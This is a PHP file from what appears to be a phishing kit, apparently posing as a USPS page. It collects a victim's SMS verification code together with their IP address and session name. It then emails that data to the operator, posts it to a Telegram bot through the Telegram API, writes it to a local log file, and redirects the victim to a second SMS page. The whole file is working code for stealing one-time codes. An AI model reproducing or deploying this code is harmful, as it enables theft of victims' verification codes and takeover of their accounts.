<?php
/*

  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
                                                                                                
                                                                                                
                                                                                                

*/
error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(
	($_POST['sms'] != "") )
{
$hostname = gethostbyaddr($ip);
$message = "[====SMS1======]\r\n";
$message .= "|SMS1 		 : ".$_POST['sms']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION["name"].") SMS1 ♠️ $ip";
$headers = "From: [ARD8NO_DAS **]<info@braindrain.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../brain.txt","a+");
fwrite($save,$message);
fclose($save);
include "../files/oldusps.gif";

echo"<script>location.replace('../sms2.php');</script>";
}else{echo"error sending";}

?>
